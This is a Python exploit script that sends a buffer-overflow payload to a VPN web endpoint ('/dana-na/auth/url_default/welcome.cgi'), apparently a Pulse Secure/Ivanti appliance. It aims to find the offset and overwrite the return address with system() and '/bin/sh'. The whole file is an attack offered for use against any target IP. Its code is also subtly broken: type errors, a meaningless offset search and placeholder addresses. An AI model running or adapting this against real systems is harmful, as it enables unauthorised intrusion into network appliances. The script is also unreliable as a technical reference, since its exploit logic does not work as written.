import requests
import sys
import struct
import socket
import time
import subprocess
import re

# Disable SSL warnings (for HTTP/HTTPS requests)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_pattern(length=500):
    """
    Generate a unique pattern to use for finding the buffer overflow offset.
    """
    try:
        pattern = subprocess.check_output(
            ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
            stderr=subprocess.STDOUT
        )
        return pattern.decode("utf-8").strip()
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating pattern: {e.output.decode()}")
        return None

def send_payload(target_ip, pattern):
    """
    Send the generated pattern to the vulnerable target to cause a crash.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 443))  # Assuming it's a web service over HTTPS

        # Prepare the exploit request
        exploit_endpoint = "/dana-na/auth/url_default/welcome.cgi"
        http_request = (
            f"POST {exploit_endpoint} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: {len(pattern)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"\r\n"
        ).encode() + pattern.encode()

        sock.send(http_request)
        response = sock.recv(4096)
        sock.close()
        return response.decode(errors="replace")
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return None

def find_offset(crash_response, pattern):
    """
    Given the crash response, find the offset by looking for the return address.
    """
    match = re.search(r"(0x[0-9a-fA-F]+)", crash_response)  # Looking for hexadecimal addresses in the response
    if match:
        return_address = match.group(0)
        print(f"[+] Found return address: {return_address}")

        # Find the position of the return address in the pattern
        offset = pattern.find(return_address)
        print(f"[+] The offset is: {offset}")
        return offset
    else:
        print("[-] No return address found in the crash response.")
        return None

def create_exploit_payload(offset, system_address=0x0804a360, command_address=0x0804b008):
    """
    Create the final exploit payload with the correct offset and addresses.
    """
    payload = b"A" * offset  # Overflow buffer
    payload += struct.pack("<I", system_address)  # Overwrite return address with system()
    payload += b"BBBB"  # Fake return address
    payload += struct.pack("<I", command_address)  # Address of the command
    payload += b"/bin/sh"  # Command to execute
    return payload

def exploit_vulnerability(target_ip, pattern):
    """
    Automate the process of generating, sending, and exploiting the buffer overflow vulnerability.
    """
    print("[+] Generating pattern...")
    pattern = generate_pattern(len(pattern))

    if pattern is None:
        print("[-] Error generating pattern, exiting...")
        return
    
    print(f"[+] Sending pattern to target {target_ip}...")
    crash_response = send_payload(target_ip, pattern)
    
    if crash_response:
        print("[+] Crash response received, analyzing for offset...")
        offset = find_offset(crash_response, pattern)
        if offset:
            print(f"[+] Creating exploit payload with offset {offset}...")
            payload = create_exploit_payload(offset)
            print("[+] Sending exploit payload to target...")
            send_payload(target_ip, payload)
            print("[+] Exploit payload sent successfully.")
        else:
            print("[-] Failed to find the correct offset.")
    else:
        print("[-] No response received from the target.")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    pattern_length = 500  # Adjust based on your findings

    exploit_vulnerability(target_ip, pattern_length)

if __name__ == "__main__":
    main()
